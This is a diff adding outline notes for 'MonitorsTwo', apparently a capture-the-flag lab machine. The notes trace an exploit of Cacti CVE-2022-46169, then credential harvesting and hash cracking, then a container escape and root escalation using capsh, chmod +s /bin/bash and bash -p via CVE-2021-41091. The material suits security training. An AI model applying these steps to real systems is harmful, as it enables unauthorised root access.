@@ -1,0 +1,90 @@
+MonitorsTwo:
+  OS: Linux
+  Difficulty: Easy
+  Open ports:
+    - 22
+    - 80
+
+  Website 80/tcp:
+    Technologies:
+      Cacti 1.2.22:
+        Vulnerable to CVE-2022-46169 (Cacti <1.2.23):
+          Write exploit:
+            CVE-2022-46169.py
+
+  Shell as www-data (On container 172.19.0.3):
+    id: Only user group
+    /etc/passwd: No other users
+    /etc/hosts:
+      172.19.0.3: Docker container IP
+    /etc/apache2/sites-enabled/000-default.conf:
+      No other virtual host
+    env: Nothing useful
+    /var/www/html/include/config.php:
+      $database_type: "mysql"
+      $database_default: "cacti"
+      $database_hostname: "db":
+        db: 172.19.0.2
+      $database_username: "root"
+      $database_password: "root"
+
+  MySQL Database (On container 172.19.0.2):
+    Databases:
+      - cacti:
+        Tables:
+          - user_auth:
+            - 1:
+              username: "admin"
+              password: "$2y$10$XNQNYu8.m52xVdeLfmjXQOYHJEGCSXZ9Qdju5bek3ZqoxE5JWJOSS":
+                "password12"
+              full_name: "Jamie Thompson"
+              email_address: "admin@monitorstwo.htb"
+            - 2:
+              username: "guest"
+              password: "43e9a4ab75570f5b"
+            - 3:
+              username: "marcus"
+              password: "$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C":
+                "funkymonkey":
+                  VALID SSH CREDS
+              full_name: "Marcus Brune"
+              email_address: "marcus@monitorstwo.htb"
+
+  Shell as marcus (On host):
+    id: Only user group
+    /etc/passwd: No other users
+    /var/mail/marcus:
+      "Security bulletin: Three Vulnerabilities to be Aware Of":
+        - CVE-2021-33033: Use-after-free leading to the write of an arbitrary value in CIPSO/IPv4
+        - CVE-2020-25706: XSS in Cacti
+        - CVE-2021-41091:
+          Execute binaries contained in docker containers:
+            Mounted containers:
+              - /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged:
+                /etc/passwd:
+                  Only mysql: Must be 172.19.0.2
+              - /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged:
+                /etc/passwd:
+                  Only www-data: Must be 172.19.0.3
+                SUID/GUID binaries owned by root:
+                  - "./usr/bin/gpasswd"
+                  - "./usr/bin/passwd"
+                  - "./usr/bin/chsh"
+                  - "./usr/bin/chfn"
+                  - "./usr/bin/newgrp"
+                  - "./sbin/capsh":
+                    Can be used to spawn a shell:
+                      "symbol lookup error: ./sbin/capsh: undefined symbol: cap_iab_get_proc": capsh cannot be used on host
+                  - "./bin/mount"
+                  - "./bin/umount"
+                  - "./bin/su"
+
+  Shell as www-data (On container 172.19.0.3):
+    "/sbin/capsh --gid=0 --uid=0 --":
+      Shell as root:
+        "chmod +s /bin/bash"
+
+  Shell as marcus (On host):
+    "/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p":
+      ROOT SHELL
+
